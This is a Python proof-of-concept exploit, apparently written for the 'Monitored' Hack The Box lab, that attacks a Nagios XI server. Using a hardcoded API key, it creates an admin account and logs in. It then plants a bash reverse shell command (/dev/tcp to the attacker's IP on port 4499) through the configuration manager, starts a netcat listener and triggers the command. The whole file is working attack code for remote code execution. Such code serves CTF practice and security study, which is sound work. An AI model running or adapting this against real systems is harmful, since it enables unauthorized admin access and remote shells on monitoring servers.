import random
import time
import sys
import re
import requests
import subprocess
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress the unverified HTTPS request warning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

print("[+]POC Created by 0xNayel\n      for Monitored HTB machine")

time.sleep(1)

command = 'curl -XPOST --insecure "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=myadmin&password=myadmin&name=myadmin&email=myadmin@localhost&auth_level=admin"'

try:
    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
    output = result.stdout
    if 'Invalid API Key' in output:
        print('check api key')
        sys.exit(1)
    print(output)
except subprocess.TimeoutExpired:
    print('Command timed out. Exiting.')
    sys.exit(1)
except Exception as e:
    print(f'Error: {e}')
    sys.exit(1)

if len(sys.argv) < 2:
    print("Usage: python script.py <htbip>")
    sys.exit(1)

htbip = sys.argv[1]

# URL to send the request to
url = 'https://nagios.monitored.htb/nagiosxi/login.php'

# Send a GET request to the URL with SSL verification disabled
response = requests.get(url, verify=False)

# Get the value of the 'Set-Cookie' header
cookie_parts = response.headers.get('Set-Cookie').split(';')[0].split('=')
nagiosxi_cookie = f"nagiosxi={cookie_parts[1]}"

# Print the cookie value
#print(f"{nagiosxi_cookie}")

# Parse the HTML response
soup = BeautifulSoup(response.content, 'html.parser')

# Find the hidden input field with name="nsp" and get its value
nsp_value = soup.find('input', {'name': 'nsp'}).get('value')

# Print the value of the 'nsp' variable
#print(f"nsp={nsp_value}")

# Data to send in the POST request
url1 = 'https://nagios.monitored.htb/nagiosxi/login.php'
data1 = {
    'nsp': nsp_value,
    'page': 'auth',
    'debug': '',
    'pageopt': 'login',
    'username': 'myadmin',
    'password': 'myadmin',
    'loginButton': ''
}

# Headers with the cookie value
headers1 = {
    'Cookie': nagiosxi_cookie,
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Send a POST request to the URL with the provided data and cookies
response1 = requests.post(url1, headers=headers1, data=data1, verify=False, allow_redirects=False)

# Print the new Cookie-value of the POST request

cookie_values = response1.headers.get('Set-Cookie').split(', ')
nagiosxi_cookie = ""

for cookie in cookie_values:
    if cookie.startswith('nagiosxi='):
        nagiosxi_cookie = f"nagiosxi=" + cookie.split('=')[1].split(';')[0]

# Print the cookie value
#print(f"{nagiosxi_cookie}")
print("[+]logged in done")

url2 = 'https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?type=command&page=1'
name = random.randint(100, 99999)
# Data to send in the POST request
data2 = {
    'tfName': {name},
    'tfCommand': f'bash -c \'bash -i >& /dev/tcp/{htbip}/4499 0>&1\'',
    'selCommandType': '1',
    'chbActive': '1',
    'selPlugins': 'null',
    'cmd': 'submit',
    'mode': 'insert',
    'hidId': '0',
    'hidName': '',
    'hidServiceDescription': '',
    'hostAddress': '127.0.0.1',
    'exactType': 'command',
    'type': 'command',
    'genericType': 'command',
    'returnUrl': 'index.php?cmd=view&type=command&page=1'
}

headers2 = {
    'Cookie': nagiosxi_cookie,
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Send a POST request to the URL with the provided data
response2 = requests.post(url2, headers=headers2, data=data2, verify=False, allow_redirects=False)

print(f"[+]reverse shell sent :{data2['tfCommand']}")
# Start netcat listener in a subprocess
subprocess.Popen(["nc", "-nlvp", "4499"])

url3 = 'https://nagios.monitored.htb/nagiosxi/login.php?showlicense'

headers3 = {
    'Cookie': nagiosxi_cookie
}

# Send a GET request to the URL with SSL verification disabled
response3 = requests.get(url3, headers=headers3, verify=False, allow_redirects=False)

# Parse the HTML response
soup1 = BeautifulSoup(response3.content, 'html.parser')

# Find the script tag containing the nsp_str value
script_tag = soup1.find('script', string=re.compile(r'var nsp_str = ".*";'))

# Extract the nsp_str value using a regular expression
nsp_str = re.search(r'var nsp_str = "(.*?)";', script_tag.string).group(1)

print(f"[+]Executing ....")

# URL to send the request to
url4 = 'https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?cmd=insert&type=service&returnUrl=index.php%3Fcmd%3Dview%26type%3Dservice%26page%3D1'

headers4 = {
    'Cookie': nagiosxi_cookie
}

# Send a GET request to the URL with SSL verification disabled
response4 = requests.get(url4, headers=headers4, verify=False, allow_redirects=False)


# Input string
IDres = response4.content.decode('utf-8')
# Replace {htbip} with the actual IP address in the input string
IDres = IDres.replace(htbip, "0xNayel")

# Define the pattern to match
pattern = r"command_list\['([^']+?)'\] = '(?:(?!command_list).)*?0xNayel/4499"

# Search for the pattern in the input string
match = re.search(pattern, IDres)

# If a match is found, extract the <id>
if match:
    id = match.group(1)
else:
    print("No match found.")
    exit()

# Define the URL with placeholders for the variables
url5 = 'https://nagios.monitored.htb/nagiosxi/includes/components/ccm/command_test.php?cmd=test&mode=test&address=&cid={id}&nsp={nsp_str}'

headers5 = {
    'Cookie': nagiosxi_cookie
}

# Replace the placeholders with actual values
url5 = url5.format(id=id, nsp_str=nsp_str)

# Make the request
response5 = requests.get(url5, headers=headers5, verify=False, allow_redirects=False)

time.sleep(10)
